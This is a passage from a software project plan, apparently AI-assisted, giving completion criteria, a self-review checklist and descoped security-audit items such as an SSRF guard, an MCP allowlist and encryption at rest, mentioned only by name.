The app is "10/10" when:

1. All 10 Sprint 0 tasks committed and tagged.
2. All 5 follow-up sprints planned via `/superpowers:writing-plans` (5 plan documents under `docs/superpowers/plans/`).
3. All follow-up sprints executed; each ends with `npm run verify:all` green.
4. No finding from either audit is in "open" state without an explicit "won't fix" justification committed to a `docs/won-not-fix.md` note.
5. Visual regression baselines exist for all 13 pages; Axe scans clean on all of them.
6. Threat model doc (`docs/THREAT_MODEL.md`) updated to reflect new defenses (SSRF guard, MCP allowlist, encryption at rest).

---

## Self-Review Checklist (executed at write time)

- **Spec coverage:** All ~55 audit findings are listed by ID across Sprints 0-5 with file paths. ✅
- **Placeholders:** Sprint 0 has full code in every step. Sprints 1-5 are flagged as backlog summaries requiring expansion before execution — not pretending to be ready-to-execute. ✅
- **Type consistency:** Sprint 0 names (`McpPool.ensureSpawned`, `assertPublicHttpUrl`, `validateMcpCommand`, `withApprovalLock`, `coerceApiUrl`) used consistently across tasks. ✅
- **Naming gaps:** `MEMORY.md` index — not relevant to this plan. Plan-internal cross-references intact.

---

## Notes on what's deliberately NOT in this plan

Per Karpathy #2 (simplicity), the following audit findings are descoped from Sprint 0 to keep it under one day; they appear in Sprints 1–5:

- Encryption at rest (Sprint 1) — large refactor touching every secret-bearing path. Worth its own session.
- Agentic tool loop (Sprint 1) — touches the model provider abstraction; not a 30-min change.
- Web bridge auth (Sprint 5 coverage) — the bridge is a placeholder today; the highest-leverage move is a test that prevents real wiring without auth.
- Sandbox network filter hardening (Sprint 1 candidate addition) — the regex-based filter is brittle but the actual sandbox is process-isolated; the regex is defense-in-depth. Worth a real rewrite but not blocking ship.
- Phases 13–17 roadmap items — out of scope; "10/10 the existing surface" first.

Per Karpathy #1 (surface tradeoffs), the user should know: shipping Sprint 0 alone takes the app from ~6/10 to ~8/10 (chat works, no critical RCE/SSRF, approval queue is safe). Reaching 10/10 requires Sprints 1–5.
